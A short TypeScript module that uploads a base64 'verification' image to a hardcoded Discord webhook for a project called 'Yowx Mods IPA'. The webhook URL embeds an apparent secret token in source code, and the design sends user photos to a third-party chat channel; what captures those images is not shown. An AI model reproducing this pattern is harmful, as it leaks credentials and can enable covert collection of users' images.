
// Discord service to handle sending images to Discord

const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1336794626622754857/MTE4NTQwODI3MzU3NTMxNzUxNA.G8R9Az._cf7VbjlofyoHfYO79kOjcF_a2U9jH-2Livfss';

export const sendImageToDiscord = async (imageData: string): Promise<void> => {
  // Convert base64 image to blob for sending
  const fetchResponse = await fetch(imageData);
  const blob = await fetchResponse.blob();
  
  // Create FormData to send the image
  const formData = new FormData();
  const file = new File([blob], "verification.jpg", { type: "image/jpeg" });
  
  formData.append("file", file);
  formData.append("content", "New verification image from Yowx Mods IPA");
  
  // Send to Discord webhook
  const response = await fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    body: formData,
  });
  
  if (!response.ok) {
    throw new Error("Failed to send image to Discord");
  }
  
  return;
};
